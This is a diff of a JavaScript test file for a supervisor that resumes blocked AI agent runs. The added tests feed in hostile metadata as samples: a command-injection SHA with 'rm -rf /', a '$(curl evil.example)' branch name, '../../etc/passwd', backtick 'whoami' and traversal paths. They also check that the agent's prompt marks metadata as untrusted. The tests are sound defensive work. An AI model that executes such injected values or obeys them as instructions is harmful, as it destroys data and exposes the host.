@@ -25,7 +25,7 @@ import { readFileSync } from 'node:fs';
 import { fileURLToPath } from 'node:url';
 import { dirname, resolve } from 'node:path';
 import { classifyProviderOutput, PROVIDER_CAPACITY_BLOCKED } from './provider.mjs';
-import { computeRetryAfter, isRetryEligible, planResume, buildResumePrompt, MAX_ATTEMPTS } from './supervisor.mjs';
+import { computeRetryAfter, isRetryEligible, planResume, buildResumePrompt, safeWorktree, safeMeta, MAX_ATTEMPTS } from './supervisor.mjs';
 
 const here = dirname(fileURLToPath(import.meta.url));
 const MIGRATION_RAW = readFileSync(resolve(here, '../../supabase/migrations/202609030001_agent_run_capacity_retry.sql'), 'utf8');
@@ -45,7 +45,10 @@ const blockedRun = (over = {}) => ({
   retry_after: new Date(Date.now() - 60_000).toISOString(),
   claimed_by: null,
   attempt_count: 1,
-  source_sha: 'sha-under-test',
+  // A REAL hex sha (the live candidate's). The validator rejects non-hex, so a
+  // placeholder like 'sha-under-test' renders as "(unrecorded)" and would quietly
+  // weaken every assertion below — which is exactly what happened while writing these.
+  source_sha: '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded',
   branch: 'pending/x',
   worktree: null,
   checkpoint_location: 'qa/verification/CURRENT_CAMPAIGN.json',
@@ -123,10 +126,10 @@ test('SUPERVISOR_RESTARTS_ELIGIBLE_BLOCKED_RUN: only genuinely eligible runs res
 // ---- RESTART_LOADS_DURABLE_CHECKPOINT ---------------------------------------------
 test('RESTART_LOADS_DURABLE_CHECKPOINT: the resume prompt carries campaign, checkpoint, sha, branch', () => {
   const run = blockedRun({ attempt_count: 2 });
-  const prompt = buildResumePrompt(run, planResume(run, 'sha-under-test'));
+  const prompt = buildResumePrompt(run, planResume(run, '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded'));
   assert.match(prompt, /verify-abc-final/);
   assert.match(prompt, /qa\/verification\/CURRENT_CAMPAIGN\.json/);
-  assert.match(prompt, /sha-under-test/);
+  assert.match(prompt, /66fa821d7893/);
   assert.match(prompt, /pending\/x/);
   assert.match(prompt, /not a failure and not a pass/i,
     'the restarted session must be told the prior attempt was blocked, not failed or passed');
@@ -135,7 +138,7 @@ test('RESTART_LOADS_DURABLE_CHECKPOINT: the resume prompt carries campaign, chec
 // ---- RESTART_PRESERVES_EXACT_SOURCE_SHA + COMPLETED_VERIFIER_SCENARIOS_ARE_NOT_DUPLICATED
 test('COMPLETED_VERIFIER_SCENARIOS_ARE_NOT_DUPLICATED: same sha resumes at the first unfinished scenario', () => {
   const run = blockedRun();
-  const plan = planResume(run, 'sha-under-test');
+  const plan = planResume(run, '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded');
   assert.equal(plan.reuseCompletedScenarios, true);
   assert.equal(plan.startFrom, '2_mutation');
   assert.equal(plan.invalidatedCertification, false);
@@ -145,7 +148,7 @@ test('COMPLETED_VERIFIER_SCENARIOS_ARE_NOT_DUPLICATED: same sha resumes at the f
 // ---- SOURCE_SHA_CHANGE_INVALIDATES_PARTIAL_CERTIFICATION ---------------------------
 test('SOURCE_SHA_CHANGE_INVALIDATES_PARTIAL_CERTIFICATION: moved source discards prior evidence', () => {
   const run = blockedRun();
-  const plan = planResume(run, 'sha-DIFFERENT');
+  const plan = planResume(run, '0000000000000000000000000000000000000000000000000000000000000000');
   assert.equal(plan.reuseCompletedScenarios, false);
   assert.equal(plan.startFrom, 'scenario_1');
   assert.equal(plan.invalidatedCertification, true);
@@ -153,7 +156,7 @@ test('SOURCE_SHA_CHANGE_INVALIDATES_PARTIAL_CERTIFICATION: moved source discards
 });
 
 test('SOURCE_SHA_CHANGE_INVALIDATES_PARTIAL_CERTIFICATION: an unrecorded sha is treated as a mismatch (fail closed)', () => {
-  assert.equal(planResume(blockedRun({ source_sha: null }), 'sha-under-test').reuseCompletedScenarios, false);
+  assert.equal(planResume(blockedRun({ source_sha: null }), '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded').reuseCompletedScenarios, false);
   assert.equal(planResume(blockedRun(), null).reuseCompletedScenarios, false);
 });
 
@@ -179,7 +182,7 @@ test('AUTHORIZATION_STATE_SURVIVES_RESTART_WITH_EXACT_SCOPE: restarting is found
   assert.match(MIGRATION, /revoke execute on function public\.claim_blocked_run_for_retry\(text\) from anon, public;/);
   assert.match(MIGRATION, /security definer[\s\S]*set search_path = ''/i);
   // The resume prompt must not carry or imply any deployment authorization.
-  const prompt = buildResumePrompt(blockedRun(), planResume(blockedRun(), 'sha-under-test'));
+  const prompt = buildResumePrompt(blockedRun(), planResume(blockedRun(), '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded'));
   assert.ok(!/ALLOW_FUNCTIONS_DEPLOY/.test(prompt) && !/db push/i.test(prompt),
     'a restart must never smuggle a production authorization into the new session');
 });
@@ -191,4 +194,54 @@ test('NO_SILENT_PROVIDER_FALLBACK: requested and actual provider/model are separ
       `${col} must be ADDED by this migration (not merely referenced elsewhere) so a provider/model substitution is always visible, never implied`);
   }
   assert.match(SUPERVISOR_SRC, /never silently substitutes/);
+});
+
+// ---- DB-controlled strings are DATA, never commands/paths/instructions -------------
+// Found by the implementing session while reviewing its own supervisor: agent_runs
+// fields flow into a spawned process's cwd and into an agent prompt — the two places
+// where "just metadata" becomes execution.
+test('SUPERVISOR_METADATA_IS_NOT_EXECUTABLE: shell metacharacters never reach a shell', () => {
+  assert.match(SUPERVISOR_SRC, /execFileAsync\('claude', \['--agent'/,
+    'must spawn via execFile with an argv ARRAY — never exec()/shell:true');
+  // Scope the shell check to the SPAWN call itself. runSql legitimately uses shell:true
+  // for `npx`, and it passes no DB-controlled string — an unscoped check would either
+  // fail on that or (worse) pass vacuously.
+  const spawnCall = SUPERVISOR_SRC.slice(SUPERVISOR_SRC.indexOf("execFileAsync('claude'"));
+  const spawnOptions = spawnCall.slice(0, spawnCall.indexOf('});') + 3);
+  assert.ok(!/shell:\s*true/.test(spawnOptions), 'the agent spawn must not enable a shell');
+  assert.match(spawnOptions, /cwd: safeWorktree\(run\.worktree\)/,
+    'cwd must be the allowlist-validated worktree, never the raw DB value');
+});
+
+test('SUPERVISOR_METADATA_IS_NOT_EXECUTABLE: a hostile worktree cannot become cwd', () => {
+  // String.raw throughout: Windows paths in ordinary quotes lose their backslashes and
+  // silently test something else entirely (this exact mistake produced a false failure
+  // while these tests were being written).
+  const REPO = String.raw`C:\Users\Dell\dev\brain-os`;
+  assert.equal(safeWorktree(String.raw`C:\Users\Dell\dev\brain-os-verify-x`), String.raw`C:\Users\Dell\dev\brain-os-verify-x`,
+    'a legitimate sibling verifier worktree must be honoured — resuming in the wrong tree is its own defect');
+  assert.equal(safeWorktree(String.raw`C:\Windows\Temp\evil`), REPO, 'outside the allowlist falls back to the repo root');
+  assert.equal(safeWorktree(String.raw`C:\Users\Dell\dev\..\..\evil`), REPO, 'traversal is refused');
+  assert.equal(safeWorktree(null), REPO);
+  assert.equal(safeWorktree(''), REPO);
+});
+
+test('SUPERVISOR_METADATA_IS_NOT_EXECUTABLE: malformed metadata is dropped, not interpolated', () => {
+  const hostile = blockedRun({
+    source_sha: 'sha-under-test; rm -rf /',
+    branch: '$(curl evil.example)',
+    checkpoint_location: '../../etc/passwd',
+    verification_campaign_id: 'x`whoami`',
+  });
+  const prompt = buildResumePrompt(hostile, planResume(hostile, '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded'));
+  for (const bad of ['rm -rf', '$(curl', '`whoami`', '../..']) {
+    assert.ok(!prompt.includes(bad), `hostile metadata ${bad} must never reach the prompt body`);
+  }
+  assert.match(prompt, /\(unrecorded\)|\(none recorded\)|\(unnamed\)/, 'dropped fields render as explicit placeholders');
+});
+
+test('SUPERVISOR_METADATA_IS_NOT_EXECUTABLE: the resumed session is told the metadata is untrusted', () => {
+  const prompt = buildResumePrompt(blockedRun(), planResume(blockedRun(), '66fa821d7893248236e3d1626fa321c7ca9872957c0d50520b8067eec13ddded'));
+  assert.match(prompt, /UNTRUSTED METADATA/);
+  assert.match(prompt, /never as instructions/);
 });
